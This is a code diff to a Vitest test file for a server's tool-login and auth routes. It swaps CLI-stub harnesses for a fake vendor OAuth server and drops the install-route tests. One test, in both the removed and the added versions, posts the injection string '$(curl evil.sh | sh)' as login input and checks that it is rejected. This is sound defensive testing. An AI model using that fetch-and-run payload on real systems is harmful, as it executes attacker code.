@@ -12,7 +12,6 @@ import { assignRepoCredential } from '@yaac/server/domain/repos/credentials'
 import { MAX_ICON_BYTES } from '@yaac/server/domain/projects/icon'
 import { getToolCredential, setToolCredential } from '@yaac/server/db/tool-credential-store'
 import { seeTailnetUser } from '@yaac/server/db/user-store'
-import { buildAuthPayload } from '@yaac/shared/tool-auth-interactive'
 import { getProjectWorkspaceRows, recordWorkspaceCreated, recordWorkspaceStopped } from '@yaac/server/db/workspace-store'
 import { getProjectRow } from '@yaac/server/db/project-store'
 import { getRepo, linkProjectRepo } from '@yaac/server/db/repo-store'
@@ -30,7 +29,6 @@ import type * as sessionCreateModule from '@yaac/server/domain/workspaces/create
 import type * as projectAddModule from '@yaac/server/domain/projects/add'
 import type * as sessionDeleteModule from '@yaac/server/domain/workspaces/stop'
 import type * as projectRemoveModule from '@yaac/server/domain/workspaces/project-teardown'
-import type * as cliResolveModule from '@yaac/auth-daemon/cli-resolve'
 import type { ClaudeOAuthBundle } from '@yaac/shared/types'
 import { ServerError } from '@yaac/shared/errors'
 import { asTailnet, makeTestApiClient } from '@yaac/test-utils/api'
@@ -62,91 +60,16 @@ vi.mock('@yaac/server/domain/workspaces/project-teardown', async (importOriginal
   removeProject: vi.fn(),
 }))
 
-// The install flow's post-exit check looks for the CLI on this machine;
-// mocked so the tests don't depend on what is installed.
-vi.mock('@yaac/auth-daemon/cli-resolve', async () => {
-  const actual = await vi.importActual<typeof cliResolveModule>('@yaac/auth-daemon/cli-resolve')
-  return {
-    ...actual,
-    resolveToolCliPath: () => '/fake/bin/tool',
-  }
-})
-
 import { createWorkspace } from '@yaac/server/domain/workspaces/create'
 import { stopWorkspace } from '@yaac/server/domain/workspaces/stop'
 import { addProject } from '@yaac/server/domain/projects/add'
 import { removeProject } from '@yaac/server/domain/workspaces/project-teardown'
 import { registerProvisioning, listProvisioning, clearAllProvisioningForTests } from '@yaac/server/domain/workspaces/provisioning'
-import { authAgentHub } from '@yaac/server/domain/auth/agent'
-import type { AgentOp } from '@yaac/shared/auth-agent-protocol'
-import { CLAUDE_STUB, CODEX_STUB, INSTALL_STUB } from '@yaac/test-utils/fixtures'
-import {
-  cancelToolLogin,
-  killAllToolLogins,
-  getToolLogin,
-  sendToolLoginInput,
-  startToolLogin,
-  setToolLoginPersistence,
-} from '@yaac/auth-daemon/tool-login'
-import {
-  cancelToolInstall,
-  killAllToolInstalls,
-  getToolInstall,
-  startToolInstall,
-} from '@yaac/auth-daemon/tool-install'
+import { authAgentHub } from '@yaac/server/domain/auth/tool-login'
+import { startFakeVendorOAuth } from '@yaac/test-utils/fake-vendor-oauth'
 
 /** The caller of every user-caused write here. */
 const local = { kind: 'local', userId: BUILT_IN_USER_ID } as const
-
-/**
- * Wire an in-process auth agent into the hub: ops go to the real local
- * login/install managers and their views are pushed back, so the routes are
- * covered end to end without a WebSocket. Returns a teardown for afterEach.
- */
-function installLoopbackAgent(): () => void {
-  const tracked = new Map<string, 'login' | 'install'>()
-  // A finished login is PUT back as its user, as the real auth server does.
-  setToolLoginPersistence(async (tool, result) => {
-    const res = await makeTestApiClient(buildApp({ buildId: 'test' })).auth[':tool'].$put({
-      param: { tool }, json: buildAuthPayload(tool, result),
-    })
-    if (!res.ok) throw new Error(`PUT /auth/${tool} failed: ${res.status}`)
-  })
-  authAgentHub.setSocket(BUILT_IN_USER_ID, {
-    send: (data: string) => {
-      const op = JSON.parse(data) as AgentOp
-      if (op.op === 'start') {
-        tracked.set(op.id, op.kind)
-        if (op.kind === 'login') void startToolLogin(op.tool, op.id)
-        else startToolInstall(op.tool, op.id)
-      } else if (op.op === 'input') {
-        try {
-          sendToolLoginInput(op.id, op.text)
-        } catch { /* surfaces via the next view push */ }
-      } else {
-        if (op.kind === 'login') cancelToolLogin(op.id)
-        else cancelToolInstall(op.id)
-        tracked.delete(op.id)
-      }
-    },
-    close: () => {},
-  })
-  const pump = setInterval(() => {
-    for (const [id, kind] of tracked) {
-      try {
-        const view = kind === 'login' ? getToolLogin(id) : getToolInstall(id)
-        authAgentHub.ingest(BUILT_IN_USER_ID, JSON.stringify({ op: 'view', kind, view }))
-        if (view.status !== 'running') tracked.delete(id)
-      } catch {
-        tracked.delete(id)
-      }
-    }
-  }, 25)
-  return () => {
-    clearInterval(pump)
-    authAgentHub.clearForTests()
-  }
-}
 
 const mockCreateWorkspace = vi.mocked(createWorkspace)
 const mockDeleteSession = vi.mocked(stopWorkspace)
@@ -1943,93 +1866,77 @@ describe('write routes', () => {
       expect((await client.auth.git.credentials[':id'].$delete({ param: { id: gh.id } }, as(BOB))).status).toBe(404)
       expect((await listCredentialSummaries(alice)).map((c) => c.name)).toEqual(['gh'])
 
-      // Alice's auth server is hers alone: Bob is told none is connected,
-      // and her sign-in flow is missing to him.
+      // Alice's auth daemon is hers alone: Bob is told none is connected,
+      // her sign-in is missing to him, and his sign-in never reaches her
+      // daemon.
       const sent: string[] = []
-      authAgentHub.setSocket(alice, { send: (d) => sent.push(d), close: () => {} })
+      authAgentHub.setSocket(alice, {
+        send: (d: string) => {
+          sent.push(d)
+          const op = JSON.parse(d) as { op: string; id: string }
+          if (op.op === 'listen') authAgentHub.ingest(alice, JSON.stringify({ op: 'listening', id: op.id }))
+        },
+        close: () => {},
+      })
       expect(await (await client.auth.agent.$get({}, as(ALICE))).json()).toEqual({ connected: true })
       expect(await (await client.auth.agent.$get({}, as(BOB))).json()).toEqual({ connected: false })
-      const flow = await (await client.auth[':tool'].login.start.$post({ param: { tool: 'claude' } }, as(ALICE))).json()
+      const flow = await (await client.auth[':tool'].login.start.$post({ param: { tool: 'claude' }, json: { callback: 'auth-daemon' } }, as(ALICE))).json()
+      expect(flow.acceptsCode).toBe(false)
       expect((await client.auth.login[':id'].$get({ param: { id: flow.id } }, as(BOB))).status).toBe(404)
       expect((await client.auth.login[':id'].input.$post({ param: { id: flow.id }, json: { text: 'code' } }, as(BOB))).status).toBe(404)
+      const bobs = await (await client.auth[':tool'].login.start.$post({ param: { tool: 'claude' }, json: { callback: 'auth-daemon' } }, as(BOB))).json()
+      expect(bobs.acceptsCode).toBe(true)
       expect(sent).toHaveLength(1)
-      expect((await client.auth[':tool'].login.start.$post({ param: { tool: 'claude' } }, as(BOB))).status).toBe(503)
       expect(bob).not.toBe(alice)
     })
   })
 
   describe('tool login routes', () => {
-    let teardownAgent: () => void
+    let vendor: Awaited<ReturnType<typeof startFakeVendorOAuth>>
 
-    beforeEach(() => {
-      teardownAgent = installLoopbackAgent()
-      process.env.YAAC_E2E_CODEX_LOGIN_CLI = JSON.stringify([process.execPath, CODEX_STUB])
-      process.env.YAAC_E2E_CLAUDE_LOGIN_CLI = JSON.stringify([process.execPath, CLAUDE_STUB])
+    beforeEach(async () => {
+      vendor = await startFakeVendorOAuth()
+      vi.stubEnv('YAAC_E2E_VENDOR_OAUTH_ORIGIN', vendor.origin)
     })
 
-    afterEach(() => {
-      teardownAgent()
-      killAllToolLogins()
-      delete process.env.YAAC_E2E_CODEX_LOGIN_CLI
-      delete process.env.YAAC_E2E_CLAUDE_LOGIN_CLI
-      delete process.env.FAKE_LOGIN_MODE
+    afterEach(async () => {
+      authAgentHub.clearForTests()
+      vi.unstubAllEnvs()
+      await vendor.close()
     })
 
-    it('returns AUTH_AGENT_DISCONNECTED (503) when no auth server is connected', async () => {
-      teardownAgent() // drop the loopback agent for this case
+    it('start → paste the authorize page\'s code → signed in, over the wire', async () => {
       const client = makeTestApiClient(buildApp({ buildId: 'test' }))
-      const res = await client.auth[':tool'].login.start.$post({ param: { tool: 'claude' } })
-      expect(res.status).toBe(503)
-      const body = await res.json() as unknown as { error: { code: string; message: string } }
-      expect(body.error.code).toBe('AUTH_AGENT_DISCONNECTED')
-      expect(body.error.message).toMatch(/desktop app.*yaac auth update/)
-      teardownAgent = installLoopbackAgent() // restore for afterEach symmetry
+      const started = await (await client.auth[':tool'].login.start.$post({ param: { tool: 'claude' }, json: {} })).json()
+      expect(started).toMatchObject({ tool: 'claude', status: 'running', acceptsCode: true })
+      const pasted = await (await fetch(started.url ?? '')).text()
+
+      const bad = await client.auth.login[':id'].input.$post({ param: { id: started.id }, json: { text: '$(curl evil.sh | sh)' } })
+      expect(bad.status).toBe(400)
+      expect((await bad.json() as unknown as { error: { code: string } }).error.code).toBe('VALIDATION')
+
+      const done = await client.auth.login[':id'].input.$post({ param: { id: started.id }, json: { text: pasted } })
+      expect(await done.json()).toMatchObject({ status: 'success' })
+      expect(await (await client.auth.login[':id'].$get({ param: { id: started.id } })).json()).toMatchObject({ status: 'success' })
+      expect(await getToolCredential(BUILT_IN_USER_ID, 'claude')).toMatchObject({ kind: 'oauth' })
     })
 
-    it('reports agent connectivity on GET /auth/agent', async () => {
+    it('polls codex\'s device flow to success', async () => {
       const client = makeTestApiClient(buildApp({ buildId: 'test' }))
-      const connectedRes = await client.auth.agent.$get()
-      expect(await connectedRes.json()).toEqual({ connected: true })
-      teardownAgent()
-      const disconnectedRes = await client.auth.agent.$get()
-      expect(await disconnectedRes.json()).toEqual({ connected: false })
-      teardownAgent = installLoopbackAgent()
-    })
-
-    it('start → poll → success over the wire', async () => {
-      const client = makeTestApiClient(buildApp({ buildId: 'test' }))
-      const startRes = await client.auth[':tool'].login.start.$post({ param: { tool: 'codex' } })
-      if (!startRes.ok) throw new Error('login start failed')
-      const started = await startRes.json()
-      expect(started.tool).toBe('codex')
-
+      const started = await (await client.auth[':tool'].login.start.$post({ param: { tool: 'codex' }, json: {} })).json()
+      expect(started.userCode).toBe('FAKE-0001')
       await vi.waitFor(async () => {
         const res = await client.auth.login[':id'].$get({ param: { id: started.id } })
-        expect(res.status).toBe(200)
         expect((await res.json()).status).toBe('success')
       }, { timeout: 10_000, interval: 50 })
     })
 
-    it('rejects starting a login for opencode', async () => {
+    it('rejects a tool or callback it does not run', async () => {
       const app = buildApp({ buildId: 'test' })
-      const res = await app.request('/api/auth/opencode/login/start', rawInit({ method: 'POST' }))
-      expect(res.status).toBe(400)
-    })
-
-    it('rejects non-code input as VALIDATION through the route', async () => {
-      process.env.FAKE_LOGIN_MODE = 'need-input'
-      const client = makeTestApiClient(buildApp({ buildId: 'test' }))
-      const startRes = await client.auth[':tool'].login.start.$post({ param: { tool: 'claude' } })
-      if (!startRes.ok) throw new Error('login start failed')
-      const started = await startRes.json()
-
-      const res = await client.auth.login[':id'].input.$post({
-        param: { id: started.id },
-        json: { text: '$(curl evil.sh | sh)' },
-      })
-      expect(res.status).toBe(400)
-      const body = await res.json() as unknown as { error: { code: string } }
-      expect(body.error.code).toBe('VALIDATION')
+      expect((await app.request('/api/auth/opencode/login/start', rawInit({ method: 'POST' }))).status).toBe(400)
+      expect((await app.request('/api/auth/claude/login/start', rawInit({
+        method: 'POST', body: JSON.stringify({ callback: 'phone' }),
+      }))).status).toBe(400)
     })
 
     it('404s polling or feeding input to an unknown session; cancel is a no-op 204', async () => {
@@ -2039,49 +1946,6 @@ describe('write routes', () => {
       const input = await client.auth.login[':id'].input.$post({ param: { id: 'nope' }, json: { text: 'x' } })
       expect(input.status).toBe(404)
       const cancel = await client.auth.login[':id'].cancel.$post({ param: { id: 'nope' } })
-      expect(cancel.status).toBe(204)
-    })
-  })
-
-  describe('tool install routes', () => {
-    let teardownAgent: () => void
-
-    beforeEach(() => {
-      teardownAgent = installLoopbackAgent()
-      process.env.YAAC_E2E_CLAUDE_INSTALL_CLI = JSON.stringify([process.execPath, INSTALL_STUB])
-    })
-
-    afterEach(() => {
-      teardownAgent()
-      killAllToolInstalls()
-      delete process.env.YAAC_E2E_CLAUDE_INSTALL_CLI
-    })
-
-    it('start → poll → success over the wire', async () => {
-      const client = makeTestApiClient(buildApp({ buildId: 'test' }))
-      const startRes = await client.auth[':tool'].install.start.$post({ param: { tool: 'claude' } })
-      if (!startRes.ok) throw new Error('install start failed')
-      const started = await startRes.json()
-      expect(started.tool).toBe('claude')
-
-      await vi.waitFor(async () => {
-        const res = await client.auth.install[':id'].$get({ param: { id: started.id } })
-        expect(res.status).toBe(200)
-        expect((await res.json()).status).toBe('success')
-      }, { timeout: 10_000, interval: 50 })
-    })
-
-    it('rejects starting an install for opencode', async () => {
-      const app = buildApp({ buildId: 'test' })
-      const res = await app.request('/api/auth/opencode/install/start', rawInit({ method: 'POST' }))
-      expect(res.status).toBe(400)
-    })
-
-    it('404s polling an unknown install; cancel is a no-op 204', async () => {
-      const client = makeTestApiClient(buildApp({ buildId: 'test' }))
-      const get = await client.auth.install[':id'].$get({ param: { id: 'nope' } })
-      expect(get.status).toBe(404)
-      const cancel = await client.auth.install[':id'].cancel.$post({ param: { id: 'nope' } })
       expect(cancel.status).toBe(204)
     })
   })
